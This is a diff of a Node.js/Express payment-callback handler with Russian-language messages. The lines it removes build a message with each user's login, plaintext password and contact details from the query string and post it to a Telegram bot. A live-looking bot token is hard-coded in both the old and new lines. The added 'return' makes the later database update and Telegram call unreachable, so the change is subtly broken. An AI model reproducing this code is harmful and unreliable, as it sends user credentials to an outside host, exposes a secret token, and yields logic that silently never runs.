@@ -118,7 +118,7 @@ app.post("/api/createPayForm", async (req,res) => {
 app.get("/api/paydone", async (req,res) => {
     try {
         console.log(req.query)
-        res.status(200).json({
+        return res.status(200).json({
             message: "Данные об оплате успешно получены"
         })
         StatsSchema.findOneAndUpdate({
@@ -160,11 +160,12 @@ app.get("/api/paydone", async (req,res) => {
                 console.log("Успешно обновили")
             }
         )
-        var message = `Новая успешная оплата%0AЛогин: ${req.query.us_login}%0AПароль: ${req.query.us_password}%0AДля связи: ${req.query.us_contact}%0AРеферал: ${req.query.us_referal}`
-        axios.post(`https://api.telegram.org/bot2061278459:AAHUbcu_npM2WdlcJcUFtMM6FDa69o1T65g/sendMessage?chat_id=1958598497&text=${message}&parse_mode=html`)
+        let message = `Новая успешная оплата%0AЛогин: ${req.query.us_login}%0AПароль: ${req.query.us_password}%0AДля связи: ${req.query.us_contact}%0AРеферал: ${req.query.us_referal}`
+        axios.post(`https://api.telegram.org/bot2061278459:AAHUbcu_npM2WdlcJcUFtMM6FDa69o1T65g/sendMessage?chat_id=-521043965&text=Hello&parse_mode=html`)
 
     } catch (error) {
-        res.status(500).json({
+        console.log()
+        return res.status(500).json({
             message: "Не получилось получить данные об оплате"
         })
     }
